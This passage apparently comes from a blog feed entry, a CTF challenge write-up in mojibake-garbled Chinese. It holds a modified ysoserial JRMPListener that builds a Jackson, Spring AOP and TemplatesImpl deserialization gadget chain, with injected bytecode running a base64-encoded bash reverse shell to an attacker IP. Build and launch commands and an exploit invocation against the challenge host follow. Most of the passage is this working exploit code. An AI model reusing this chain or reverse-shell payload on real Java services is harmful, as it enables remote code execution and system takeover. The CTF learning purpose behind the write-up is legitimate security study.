java.net.Socket;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.rmi.MarshalException;<br><span class="hljs-keyword">import</span> java.rmi.server.ObjID;<br><span class="hljs-keyword">import</span> java.rmi.server.UID;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> sun.rmi.transport.TransportConstants;<br><span class="hljs-keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Reflections;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Generic JRMP listener</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Opens up an JRMP listener that will deliver the specified payload to any</span><br><span class="hljs-comment"> * client connecting to it and making a call.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> mbechler</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@SuppressWarnings</span> ( &#123;<br>    <span class="hljs-string">&quot;restriction&quot;</span><br>&#125; )<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> port;<br>    <span class="hljs-keyword">private</span> Object payloadObject;<br>    <span class="hljs-keyword">private</span> ServerSocket ss;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">waitLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> exit;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> hadConnection;<br>    <span class="hljs-keyword">private</span> URL classpathUrl;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRMPListener</span><span class="hljs-params">(<span class="hljs-type">int</span> port, Object payloadObject )</span> <span class="hljs-keyword">throws</span> NumberFormatException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.port = port;<br>        <span class="hljs-built_in">this</span>.payloadObject = payloadObject;<br>        <span class="hljs-built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRMPListener</span><span class="hljs-params">(<span class="hljs-type">int</span> port, String className, URL classpathUrl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">this</span>.port = port;<br>        <span class="hljs-built_in">this</span>.payloadObject = makeDummyObject(className);<br>        <span class="hljs-built_in">this</span>.classpathUrl = classpathUrl;<br>        <span class="hljs-built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">waitFor</span> <span class="hljs-params">( <span class="hljs-type">int</span> i )</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">this</span>.hadConnection ) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            System.err.println(<span class="hljs-string">&quot;Waiting for connection&quot;</span>);<br>            <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>                <span class="hljs-built_in">this</span>.waitLock.wait(i);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.hadConnection;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( InterruptedException e ) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span> <span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.exit = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.ss.close();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( IOException e ) &#123;&#125;<br>        <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notify();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//expéƒ¨åˆ†</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.txt&quot;</span>));<br>        objo.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">obji</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser.txt&quot;</span>));<br>        obji.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[][] generateEvilBytes() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(AbstractTranslet.class));<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> cp.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwL2lwLzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>;<br>        <span class="hljs-comment">// ä¿®æ”¹ä¸ºè‡ªå·±çš„ip port</span><br>        cc.makeClassInitializer().insertBefore(cmd);<br>        cc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-type">byte</span>[][] evilbyte = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;;<br><br>        <span class="hljs-keyword">return</span> evilbyte;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj,String fname,T f)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(fname);<br>        filed.setAccessible(<span class="hljs-literal">true</span>);<br>        filed.set(obj,f);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><span class="hljs-comment">//        if ( args.length &lt; 3 ) &#123;</span><br><span class="hljs-comment">//            System.err.println(JRMPListener.class.getName() + &quot; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;);</span><br><span class="hljs-comment">//            System.exit(-1);</span><br><span class="hljs-comment">//            return;</span><br><span class="hljs-comment">//        &#125;</span><br><br><span class="hljs-comment">//        final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);</span><br>        <span class="hljs-comment">// åˆ é™¤writeReplace</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">wt</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(wt);<br>        ctClass0.toClass();<br><br>        <span class="hljs-comment">//æ„é€ æ¶æ„TemplatesImpl</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setValue(tmp,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setValue(tmp,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        setValue(tmp,<span class="hljs-string">&quot;_bytecodes&quot;</span>,generateEvilBytes());<br><br>        <span class="hljs-comment">//ç¨³å®šè§¦å‘</span><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">support</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        support.setTarget(tmp);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(support);<br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,handler);<br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objmapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        <span class="hljs-type">ArrayNode</span> <span class="hljs-variable">arrayNode</span> <span class="hljs-operator">=</span>objmapper.createArrayNode();<br>        arrayNode.addPOJO(proxy);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//åå°„ç»•è¿‡æ„é€ æ–¹æ³•é™åˆ¶</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(ex,arrayNode);<br><br>        Object payloadObject=ex;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> Integer.parseInt(args[ <span class="hljs-number">0</span> ]);<br>            System.err.println(<span class="hljs-string">&quot;* Opening JRMP listener on &quot;</span> + port);<br>            <span class="hljs-type">JRMPListener</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRMPListener</span>(port, payloadObject);<br>            c.run();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            System.err.println(<span class="hljs-string">&quot;Listener error&quot;</span>);<br>            e.printStackTrace(System.err);<br>        &#125;<br><span class="hljs-comment">//        Utils.releasePayload(args[1], payloadObject);</span><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span> <span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span> ( !<span class="hljs-built_in">this</span>.exit &amp;&amp; ( s = <span class="hljs-built_in">this</span>.ss.accept() ) != <span class="hljs-literal">null</span> ) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        s.setSoTimeout(<span class="hljs-number">5000</span>);<br>                        <span class="hljs-type">InetSocketAddress</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (InetSocketAddress) s.getRemoteSocketAddress();<br>                        System.err.println(<span class="hljs-string">&quot;Have connection from &quot;</span> + remote);<br><br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> s.getInputStream();<br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">bufIn</span> <span class="hljs-operator">=</span> is.markSupported() ? is : <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(is);<br><br>                        <span class="hljs-comment">// Read magic (or HTTP wrapper)</span><br>                        bufIn.mark(<span class="hljs-number">4</span>);<br>                        <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(bufIn);<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">magic</span> <span class="hljs-operator">=</span> in.readInt();<br><br>                        <span class="hljs-type">short</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> in.readShort();<br>                        <span class="hljs-keyword">if</span> ( magic != TransportConstants.Magic || version != TransportConstants.Version ) &#123;<br>                            s.close();<br>                            <span class="hljs-keyword">continue</span>;<br>                        &#125;<br><br>                        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">sockOut</span> <span class="hljs-operator">=</span> s.getOutputStream();<br>                        <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bufOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(sockOut);<br>                        <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(bufOut);<br><br>                        <span class="hljs-type">byte</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> in.readByte();<br>                        <span class="hljs-keyword">switch</span> ( protocol ) &#123;<br>                            <span class="hljs-keyword">case</span> TransportConstants.StreamProtocol:<br>                                out.writeByte(TransportConstants.ProtocolAck);<br>                                <span class="hljs-keyword">if</span> ( remote.getHostName() != <span class="hljs-literal">null</span> ) &#123;<br>                                    out.writeUTF(remote.getHostName());<br>                                &#125; <span class="hljs-keyword">else</span> &#123;<br>                                    out.writeUTF(remote.getAddress().toString());<br>                                &#125;<br>                                out.writeInt(remote.getPort());<br>                                out.flush();<br>                                in.readUTF();<br>                                in.readInt();<br>                            <span class="hljs-keyword">case</span> TransportConstants.SingleOpProtocol:<br>                                doMessage(s, in, out, <span class="hljs-built_in">this</span>.payloadObject);<br>                                <span class="hljs-keyword">break</span>;<br>                            <span class="hljs-keyword">default</span>:<br>                            <span class="hljs-keyword">case</span> TransportConstants.MultiplexProtocol:<br>                                System.err.println(<span class="hljs-string">&quot;Unsupported protocol&quot;</span>);<br>                                s.close();<br>                                <span class="hljs-keyword">continue</span>;<br>                        &#125;<br><br>                        bufOut.flush();<br>                        out.flush();<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> ( InterruptedException e ) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>                        e.printStackTrace(System.err);<br>                    &#125;<br>                    <span class="hljs-keyword">finally</span> &#123;<br>                        System.err.println(<span class="hljs-string">&quot;Closing connection&quot;</span>);<br>                        s.close();<br>                    &#125;<br><br>                &#125;<br><br>            &#125;<br>            <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> ( s != <span class="hljs-literal">null</span> ) &#123;<br>                    s.close();<br>                &#125;<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">this</span>.ss != <span class="hljs-literal">null</span> ) &#123;<br>                    <span class="hljs-built_in">this</span>.ss.close();<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( SocketException e ) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace(System.err);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doMessage</span> <span class="hljs-params">( Socket s, DataInputStream in, DataOutputStream out, Object payload )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.err.println(<span class="hljs-string">&quot;Reading message...&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">op</span> <span class="hljs-operator">=</span> in.read();<br><br>        <span class="hljs-keyword">switch</span> ( op ) &#123;<br>            <span class="hljs-keyword">case</span> TransportConstants.Call:<br>                <span class="hljs-comment">// service incoming RMI call</span><br>                doCall(in, out, payload);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> TransportConstants.Ping:<br>                <span class="hljs-comment">// send ack for ping</span><br>                out.writeByte(TransportConstants.PingAck);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> TransportConstants.DGCAck:<br>                <span class="hljs-type">UID</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> UID.read(in);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;unknown transport op &quot;</span> + op);<br>        &#125;<br><br>        s.close();<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doCall</span> <span class="hljs-params">( DataInputStream in, DataOutputStream out, Object payload )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in) &#123;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass ( ObjectStreamClass desc ) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-string">&quot;[Ljava.rmi.server.ObjID;&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID[].class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;java.rmi.server.ObjID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID.class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( <span class="hljs-string">&quot;java.rmi.server.UID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> UID.class;<br>                &#125;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Not allowed to read object&quot;</span>);<br>            &#125;<br>        &#125;;<br><br>        ObjID read;<br>        <span class="hljs-keyword">try</span> &#123;<br>            read = ObjID.read(ois);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( java.io.IOException e ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;unable to read objID&quot;</span>, e);<br>        &#125;<br><br><br>        <span class="hljs-keyword">if</span> ( read.hashCode() == <span class="hljs-number">2</span> ) &#123;<br>            ois.readInt(); <span class="hljs-comment">// method</span><br>            ois.readLong(); <span class="hljs-comment">// hash</span><br>            System.err.println(<span class="hljs-string">&quot;Is DGC call for &quot;</span> + Arrays.toString((ObjID[])ois.readObject()));<br>        &#125;<br><br>        System.err.println(<span class="hljs-string">&quot;Sending return with payload for obj &quot;</span> + read);<br><br>        out.writeByte(TransportConstants.Return);<span class="hljs-comment">// transport op</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRMPClient</span>.MarshalOutputStream(out, <span class="hljs-built_in">this</span>.classpathUrl);<br><br>        oos.writeByte(TransportConstants.ExceptionalReturn);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">UID</span>().write(oos);<br><br><span class="hljs-comment">//        BadAttributeValueExpException ex = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        Reflections.setFieldValue(ex, &quot;val&quot;, payload);</span><br>        oos.writeObject(payload);<span class="hljs-comment">//ç›´æ¥å†™æˆå‹çš„payloadè¿‡å»å³å¯</span><br><br>        oos.flush();<br>        out.flush();<br><br>        <span class="hljs-built_in">this</span>.hadConnection = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notifyAll();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@SuppressWarnings(&#123;&quot;deprecation&quot;&#125;)</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeDummyObject</span> <span class="hljs-params">(String className)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">isolation</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>() &#123;&#125;;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>();<br>            cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Dummy.class));<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cp.get(Dummy.class.getName());<br>            clazz.setName(className);<br>            <span class="hljs-keyword">return</span> clazz.toClass(isolation).newInstance();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dummy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨è¯¥å‘½ä»¤é‡æ–°æ‰“åŒ…ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mvn clean package -DskipTests  <span class="hljs-comment"># è¿™é‡Œä¸è·³è¿‡æµ‹è¯•ä¼šæŠ¥é”™ï¼Œå› ä¸ºä¸çŸ¥é“ç‰ˆæœ¬åŸå› è¿˜æ˜¯æ€ä¹ˆçš„å¾ˆå¤šä¾èµ–å’Œæ’ä»¶çˆ†çº¢</span><br></code></pre></td></tr></table></figure><p>ç„¶åç”¨ä¸‹é¢çš„å‘½ä»¤å¼€å¯JRMPæœåŠ¡å™¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 80<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241026144410160.png" alt="image-20241026144410160"></p><p>ç„¶åæ­¤æ—¶æ‰“expåå¼¹shell</p><p>expæ‰§è¡Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">python .\exp.py <span class="hljs-string">&quot;http://7ae47afd-3eda-472c-9c1b-7ce01d6a534f.node5.buuoj.cn&quot;</span> <span class="hljs-string">&quot;&lt;vpsåœ°å€&gt;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241026153215483.png" alt="image-20241026153215483"></p><p><img src="https://cdn.clown2024.cn/image-20241026153245566.png" alt="image-20241026153245566"></p><p><img src="https://cdn.clown2024.cn/image-20241026153257626.png" alt="image-20241026153257626"></p><p>å¼¹shellè¿‡æ¥æ‹¿åˆ°flag</p><blockquote><p>è‰¹äº†æ‰“expçš„æ—¶å€™ä¸€ç›´å†™é”™æœåŠ¡å™¨åœ°å€è ¢äº†ï¼Œå¤šåŠ äº†ä¸€ä¸ªhttp:&#x2F;&#x2F;ï¼Œç›´æ¥å†™ipå°±è¡Œäº†</p><p>è¿˜æœ‰ä¸€ç‚¹æ˜¯rmi:&#x2F;&#x2F;&lt;æœåŠ¡å™¨åœ°å€&gt;&#x2F;a è¿™é‡Œè¦åŠ ä¸€ä¸ªè®¿é—®è·¯å¾„ï¼Œä¸ç„¶ä¹Ÿä¼šæ”¶ä¸åˆ°payloadï¼Œè¿™æˆ‘åœ¨æœ¬åœ°æµ‹è¯•è¿‡ï¼Œæˆ‘ä¹Ÿä¸æ¸…æ¥šä¸ºå•¥ï¼Œå¯ä»¥è·ŸJRMPçš„æ¨¡å—å®ç°æœ‰å…³ï¼Œè¿™éƒ¨åˆ†åé¢å­¦ä¹ JRMPæ¨¡å—çš„æ—¶å€™å†æ¢ç©¶ä¸€ä¸‹</p></blockquote><p>è¿™é¢˜å¤ç°çœŸçš„æ›²æŠ˜ï¼Œwpå†™çš„è¿‡äºç®€ç•¥è®©æˆ‘è¿™ä¸ªèœé¸¡çœ‹ä¸å¤ªæ‡‚ğŸ˜­</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å®˜æ–¹wpé“¾æ¥ï¼š&lt;a href=&quot;https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#FAsbS&quot;&gt;https://www.yuque.com/chuangfeimeiyige</summary>
      
    
    
    
    <category term="é¢˜ç›®å¤ç°" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="ctf" scheme="https://clowsman.github.io/tags/ctf/"/>
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>UTF-8 Overlong Encodingç»•è¿‡å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-20T12:39:41.000Z</published>
    <updated>2024-11-11T12:12:42.163Z</updated>
    
